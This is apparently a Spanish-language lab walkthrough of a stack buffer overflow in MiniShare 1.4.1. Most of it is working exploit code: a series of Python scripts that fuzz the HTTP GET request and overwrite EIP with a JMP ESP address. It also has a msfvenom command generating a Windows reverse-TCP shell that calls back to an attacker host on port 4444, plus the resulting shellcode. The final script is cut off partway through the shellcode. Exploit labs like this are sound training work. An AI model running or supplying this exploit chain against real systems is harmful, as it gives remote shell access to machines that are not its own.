# BUFFEROVERFLOW-MINISHARE-1.4.1
***
Se procedera a realizar un desdoblamiento de buffer con el software MINISHARE 1.4.1 habrimos una ventana emergente al lado de nuestro tilix para poder trabajar, usamos el siguiente comando, colacando la IP de la maquina vulnerable.
***
``` 
rdesktop 192.168.72.135 -u Rberrospi -p lab
```
****
### Screenshot
![inicio](https://user-images.githubusercontent.com/104048850/180593311-1796279a-4a4f-4ee8-8fae-baa47898a6e4.png)
Procedemos a realizar un escaneo de vulnerabilidades 
``` 
nmap 192.168.72.135 -sV

```
***
Podemos observar los puertos de la maquina vulnerable sin ejecutar el programa 
***
### Screenshot
![nmap](https://user-images.githubusercontent.com/104048850/180593535-955c4085-6369-4afb-b5e7-dd56e463c24f.png)
***
Ahora realizaremos el escaneo ejecutando el programa minishare usando la herramiento immunity debugger
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180593763-736524cd-0f76-4ce6-9894-0780023678ad.png)

Para ver que comando vamos a usar, utilizaremos burpsuite y un proxy 
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180593888-219158db-ad4b-454e-a6e5-2aa429d6c417.png)
***
                 Ahora  ejecutamos el siguinte script  para ver la capacidad del buffer prueba.py

```
n
#!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 1 of proof of concept by Vry4n
# This script is intended to discover the size of the buffer
import socket

FUZZ = ""

# While true increase the variable FUZZ by adding 100 "A" until the program crashes
while True:
    FUZZ += "A" * 100
    print("Fuzzing with {} bytes".format(len(FUZZ)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(("192.168.72.135", 80))
    # from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
    s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
    s.recv(1024)
    s.close()

```
Ejecutamos prueba.py arrojandonos que su cvapacidad es de 1800 Bytes  nota: El minishare tiene que estar corriendo, cada ves que ejecutemos una acciones debemos reiniciar 
```
python prueba.py 
```

### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180594493-62683eb9-2e28-498a-911c-de43adb2b45d.png)

Ahora que sabemos que el tamaño máximo de la pila es 1800, podemos modificar nuestro script para enviarlos en un solo paquete y procedemos a ejecutar 
```
 mousepad prueba2.py 
```

```
 !/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 2 of proof of concept by Vry4n
# This script is intended send all the buffer size in one packet, we need to see if EIP value gets overwritten 41414141 (AAAA)
import socket

FUZZ = "A" * 1800

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
```
Ahora procedemos a ejecutar el prueba2.py, observamos todas las "A" que se le ha injectado
```
python prueba2.py
```
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180594819-7be3083c-768f-476d-beb5-ac242fda0f34.png)

Como siguinte paso deberemos calcular el desplazamiento exacto del EIP aplicando los 1800 Bytes, obteniendo. 
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9
```
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180594966-278807d0-b3cd-43e2-92a2-e981bb6a8e00.png)

Modificamos nuestro scrip adiriendo los datos obtenidos anteriormente, procedemos a ejecutar, obtendremos la EIP variada 36684335 la cual usaremos a posterior 

```
python exploit.minishare.py
```

```
!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 2 of proof of concept by Vry4n
# This script is intended send all the buffer size in one packet, we need to see if EIP value gets overwritten 41414141 (AAAA)
import socket

FUZZ = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
```
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180595167-e0ed6290-973d-447c-9d5a-56d043476fe5.png)

Ahora  que hemos localizado el patrón en EIP 36684335, necesitamos encontrar la posición dentro de esos 1800 bytes generados
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 36684335 -l 1800
```
### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180595341-d11be835-0715-4c7a-9963-ee42e121a5c4.png)

 Ahora necesitamos editar el script para enviar 1787 bytes como A, seguido de 4 bytes como B
 ```
 #!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 4 of proof of concept by Vry4n
# This script is intended the specific stack crash 1787 bytes (A) and 4 more bytes (B) characters to overwrite the EIP
import socket

# buffer 1787
FUZZ = "A" * 1787
EIP = "B" * 4

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
 ```
 Ahora ejecutamos el exploi.minishare2.1.py, notaremos que el valor del registro EIP ahora es 42424242, lo que significa BBBB
 
 ### Screenshot
 ![image](https://user-images.githubusercontent.com/104048850/180596056-4048982c-594b-4dda-906e-d7cf28f2cfb3.png)

                    El siguiente paso sera identificar a los Badchars 
   ```
   \x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18 \x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31 \x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a \x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63 \x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c \x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95 \x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae \xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7 \xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef \xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
   ```
A continuación tenemos la lista de badchars, tenga en cuenta que \x00\x0d en nuestro  siempre son  badchar, modificamos nuestro script exploit.minishare2.py
 ```
 #!/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 4 of proof of concept by Vry4n
# This script is intended the specific stack crash 1787 bytes (A) and 4 more bytes (B) characters to overwrite the EIP
import socket

# buffer 1787
FUZZ = "A" * 1787
EIP = "B" * 4

#badchars found : \x00\
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
 ```
  Ahora ejecutamos, notamos que esta descontinuado
 ### Screenshot
  ![image](https://user-images.githubusercontent.com/104048850/180596407-ef2004a2-4693-4ca4-a183-92a8f8c675c9.png)
 
 Ahora modificamos quitando el \x00\xd, notamos que ahora si sigue la secuencia exploit.minishare3.py 

 ```
 python exploit.minishare3.py 
```

 ```
 !/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 4 of proof of concept by Vry4n
# This script is intended the specific stack crash 1787 bytes (A) and 4 more bytes (B) characters to overwrite the EIP
import socket

# buffer 1787
FUZZ = "A" * 1787
EIP = "B" * 4
# barchrds found : "\x00""\x0d"
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP.encode() + badchars + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
 ```
 ejecutamos 
 
 ```
  python exploit.minishare2.py 
  ```
  ### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180596734-c65ece10-3015-460a-8065-a953b4cdac42.png)

  Hallamos el codigo  de operación de JMP ESP
  
 ```
usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 ```
  ### Screenshot
  ![image](https://user-images.githubusercontent.com/104048850/180597014-fa89f320-440e-45d2-98b9-0cb0ceb57536.png)

  Ahora procemos a encontar el JMP ESP, click en el inmunity dibugger y ejecutamos el siguiente comando 
  
  ```
  !mona modules 
  ```
  Ahora escogemos un modulo nosotros usaremos el USER32, lo buscamos de la siguiente manera 
  
   ### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180597183-28356998-3078-45d6-86ce-3bf31848bc2d.png)

Tambien podemos ejecuar el siguiente comando 

  ```
!mona find -s "\xFF\xE4" -m SHELL32.dll
  ```
  ahora que conocemos el objeto 76E768C7 modificamos nuestro script exploi.minishare4.py
  
```
r/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 6 of proof of concept by Vry4n
# This script is intended full the buffer, modify EIP value with our JMP ESP value 7E4456F7, which refers to USER32.dll
# execute it, and then fill with Cs

# badchars \x00\x0d
# JMP ESP 76E768C7, as this is intel processor this is read as little endian, see EIP variable from lest significant bit
import socket
#76E768C7  FFE4             JMP ESP
# buffer 1787
FUZZ = "A" * 1787
EIP =  b"\xC7\x68\xE7\x76"
junk = "C" * 500


print("Fuzzing with {} bytes".format(len(FUZZ)))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(("192.168.72.135", 80))
# from a web proxy capturing the HTTP GET Request, we got this line "GET / HTTP/1.1" This is the vulnerable section
s.send(b"GET " + FUZZ.encode() + EIP + junk.encode() + b"HTTP/1.1\r\n\r\n")
s.recv(1024)
s.close()
 ```
```
python exploit.minishare4.py
```

   ### Screenshot
   ![image](https://user-images.githubusercontent.com/104048850/180597490-0ddffa47-25ad-47a5-9d7d-47826b299683.png)
   
   Después de la ejecución exitosa del script, podemos verificar los datos de la pila entre As y Cs, vemos la ejecución de USER32.dll
   
# AHORA PASAMOS A LA GENERACION DEL Shellcode

Generamos  la carga útil usando MSFVenom con el siguiente comando 
```
 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.72.128 LPORT=4444 -b "\x00\x0d" -v shellcode -f python
 ```
 ```
 shellcode =  b""
shellcode += b"\xdb\xde\xb8\xb9\x99\xdc\xca\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x59\x31\x43\x19\x03\x43\x19"
shellcode += b"\x83\xc3\x04\x5b\x6c\x20\x22\x14\x8f\xd9\xb3"
shellcode += b"\x4a\x19\x3c\x82\x58\x7d\x34\xb7\x6c\xf5\x18"
shellcode += b"\x34\x07\x5b\x89\x4b\xa0\x16\x97\xd8\xbc\x8e"
shellcode += b"\xe6\x21\x71\x0f\xa4\xe2\x10\xf3\xb7\x36\xf2"
shellcode += b"\xca\x77\x4b\xf3\x0b\xce\x21\x1c\xc1\x86\x42"
shellcode += b"\xb0\xf6\xa3\x17\x08\xf6\x63\x1c\x30\x80\x06"
shellcode += b"\xe3\xc4\x3c\x08\x34\xaf\xf5\x12\x3f\xf7\x25"
shellcode += b"\x22\xec\x57\xa3\xed\x66\x6b\xe2\x66\xb2\x18"
shellcode += b"\xc5\x87\xba\xc8\x17\xb8\x7c\x3b\x5a\x94\x7e"
shellcode += b"\x04\x5d\x04\xf5\x7e\x9d\xb9\x0e\x45\xdf\x65"
shellcode += b"\x9a\x59\x47\xed\x3c\xbd\x79\x22\xda\x36\x75"
shellcode += b"\x8f\xa8\x10\x9a\x0e\x7c\x2b\xa6\x9b\x83\xfb"
shellcode += b"\x2e\xdf\xa7\xdf\x6b\xbb\xc6\x46\xd6\x6a\xf6"
shellcode += b"\x98\xbe\xd3\x52\xd3\x2d\x05\xe2\x1c\xae\x2a"
shellcode += b"\xbe\x8a\x62\xe7\x41\x4a\xed\x70\x31\x78\xb2"
shellcode += b"\x2a\xdd\x30\x3b\xf5\x1a\x41\x2b\x06\xf4\xe9"
shellcode += b"\x3c\xf8\xf5\x09\x14\x3f\xa1\x59\x0e\x96\xca"
shellcode += b"\x32\xce\x17\x1f\xae\xc4\x8f\x60\x86\x91\xcf"
shellcode += b"\x09\xd4\x21\xc1\x95\x51\xc7\xb1\x75\x31\x58"
shellcode += b"\x72\x26\xf1\x08\x1a\x2c\xfe\x77\x3a\x4f\xd5"
shellcode += b"\x1f\xd1\xa0\x83\x48\x4e\x58\x8e\x03\xef\xa5"
shellcode += b"\x05\x6e\x2f\x2d\xaf\x8e\xfe\xc6\xda\x9c\x17"
shellcode += b"\xb1\x24\x5d\xe8\x54\x24\x37\xec\xfe\x73\xaf"
shellcode += b"\xee\x27\xb3\x70\x10\x02\xc0\x77\xee\xd3\xf0"
shellcode += b"\x0c\xd9\x41\xbc\x7a\x26\x86\x3c\x7b\x70\xcc"
shellcode += b"\x3c\x13\x24\xb4\x6f\x06\x2b\x61\x1c\x9b\xbe"
shellcode += b"\x8a\x74\x4f\x68\xe3\x7a\xb6\x5e\xac\x85\x9d"
shellcode += b"\xdc\xab\x79\x63\xcb\x13\x11\x9b\x4b\xa4\xe1"
shellcode += b"\xf1\x4b\xf4\x89\x0e\x63\xfb\x79\xee\xae\x54"
shellcode += b"\x11\x65\x3f\x16\x80\x7a\x6a\xf6\x1c\x7a\x99"
shellcode += b"\x23\xaf\x01\xd2\xd4\x50\xf6\xfa\xb0\x51\xf6"
shellcode += b"\x02\xc7\x6e\x20\x3b\xbd\xb1\xf0\x78\xce\x84"
shellcode += b"\x55\x28\x45\xe6\xca\x2a\x4c"
```

  ### Screenshot
![image](https://user-images.githubusercontent.com/104048850/180597709-2bf21ca0-1eb8-479f-8a9f-62424c64bec3.png)

Ahora procedmos a modificar nuestro script shellcode.py 

```
/usr/bin/python3.8
# This is a Proof of concept about BufferOverflow vulnerability in MiniShare 1.4.1

# Part 8 of proof of concept by Vry4n
# This script is intended full the buffer, modify EIP value with our JMP ESP value 7E4456F7, which refers to USER32.dll
# execute it, and then fill it with our code generated with msfvenom to spawn a reverse connection

# badchars \x00\x0d
# JMP ESP 76E768C7 as this is intel processor this is read as little endian, see EIP variable from lest significant bit
import socket


# buffer 1787
# NOPs are ncessary to separate our code with the register EIP
FUZZ = "A" * 1787
EIP =  b"\xC7\x68\xE7\x76"
NOPS = b"\x90" * 32
shellcode =  b""
shellcode += b"\xda\xd3\xbe\xbf\x85\x1e\xa1\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x59\x83\xc3\x04\x31\x73\x15"
shellcode += b"\x03\x73\x15\x5d\x70\xe2\x49\x2e\x7b\x1b\x8a"
shellcode += b"\x50\x4d\xc9\x03\x75\xc9\x66\x41\x45\x99\x2b"
shellcode += b"\x6a\x2e\xcf\xdf\xf9\x42\xd8\xee\x02\xad\xaf"
shellcode += b"\x5b\xdb\x80\x0f\xf7\x1f\x83\xf3\x0a\x4c\x63"
shellcode += b"\xcd\xc4\x81\x62\x0a\x93\xec\x8b\xc6\x73\x84"
shellcode += b"\x01\xf7\xf0\xd8\x99\xf6\xd6\x56\xa1\x80\x53"
shellcode += b"\xa8\x55\x3d\x5d\xf9\x1e\xf5\x45\xa9\xab\x5e"
shellcode += b"\x56\x48\x78\xdb\x5f\x3e\x42\xad\xd4\x8b\x31"
shellcode += b"\x1c\x14\xf2\x93\x6e\x2a\x59\xda\x5e\xa7\xa3"
shellcode += b"\x1b\x58\x58\xd6\x57\x9a\xe5\xe1\xac\xe0\x31"
